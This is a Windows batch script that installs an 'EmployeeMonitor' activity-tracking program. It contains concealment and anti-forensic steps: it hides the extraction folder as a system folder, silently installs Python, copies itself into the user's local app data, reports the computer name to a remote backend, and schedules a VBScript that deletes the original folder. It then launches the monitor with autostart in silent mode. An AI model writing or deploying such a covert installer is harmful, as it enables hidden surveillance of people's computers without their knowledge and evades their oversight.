@echo off
setlocal
pushd "%~dp0"

rem Hide the entire extraction folder immediately (before anything else can go wrong)
for %%p in ("%~dp0..") do attrib +h +s "%%~fp" >nul 2>&1

if exist "%~dp0deploy_automated.bat" (
    call "%~dp0deploy_automated.bat"
    popd
    endlocal
    exit /b 0
)

set BACKEND_URL=https://eyeing.onrender.com
if "%INSTALL_ID%"=="" set INSTALL_ID=%RANDOM%%RANDOM%%RANDOM%
if "%DEVICE_ID%"=="" set DEVICE_ID=%COMPUTERNAME%
if exist "%~dp0backend_url.txt" (
    for /f "usebackq delims=" %%i in ("%~dp0backend_url.txt") do (
        if not "%%i"=="" set BACKEND_URL=%%i
    )
)

if "%SKIP_SETUP_OPEN%"=="1" goto skip_setup_open
start "" "%BACKEND_URL%/setup.html?autoclose=1^&device_id=%DEVICE_ID%^&install_id=%INSTALL_ID%"
:skip_setup_open

rem Kill any existing monitor / install processes
powershell -NoProfile -ExecutionPolicy Bypass -Command "$currentPid=$PID; Get-CimInstance Win32_Process | Where-Object { $_.ProcessId -ne $currentPid -and ($_.CommandLine -match 'install_and_run\.py' -or $_.CommandLine -match 'monitor\.py') } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"

rem Preserve install_context.json — only remove stale logs
if exist "%~dp0activity_data\activity_monitor.log" del /f /q "%~dp0activity_data\activity_monitor.log" >nul 2>&1
if exist "%~dp0activity_data\activity_monitor.db"  del /f /q "%~dp0activity_data\activity_monitor.db"  >nul 2>&1
if exist "%~dp0activity_monitor.log" del /f /q "%~dp0activity_monitor.log" >nul 2>&1

rem Relocate to permanent directory so extraction folder can be deleted afterwards
set "PERM_DIR=%LOCALAPPDATA%\EmployeeMonitor"
if not exist "%PERM_DIR%" mkdir "%PERM_DIR%"
xcopy /e /i /y "." "%PERM_DIR%\" >nul 2>&1

where python >nul 2>&1
if %errorlevel% neq 0 (
    set PYTHON_URL=https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe
    set PYTHON_INSTALLER=%TEMP%\python_installer.exe
    powershell -Command "Invoke-WebRequest -Uri '%PYTHON_URL%' -OutFile '%PYTHON_INSTALLER%'" >nul 2>&1
    start /wait "" "%PYTHON_INSTALLER%" /quiet InstallAllUsers=1 PrependPath=1 >nul 2>&1
    set PATH=%PATH%;%LOCALAPPDATA%\Programs\Python\Python312;%LOCALAPPDATA%\Programs\Python\Python312\Scripts
)

rem Write a VBScript cleanup timer to TEMP — wscript.exe is a GUI app (not console-attached)
rem so it won't be killed when this cmd.exe exits, regardless of how fast Python finishes.
for %%p in ("%~dp0..") do set EM_EXTRACT_DIR=%%~fp
(
    echo WScript.Sleep 30000
    echo Set fso = CreateObject^("Scripting.FileSystemObject"^)
    echo If fso.FolderExists^("%EM_EXTRACT_DIR%"^) Then fso.DeleteFolder "%EM_EXTRACT_DIR%", True
) > "%TEMP%\em_cleanup.vbs"
start /b "" wscript.exe "%TEMP%\em_cleanup.vbs"

rem Run Python synchronously so it stays alive through pip install + monitor launch
python "%PERM_DIR%\install_and_run.py" --autostart --silent >"%PERM_DIR%\setup_log.txt" 2>&1

popd
endlocal
exit /b 0
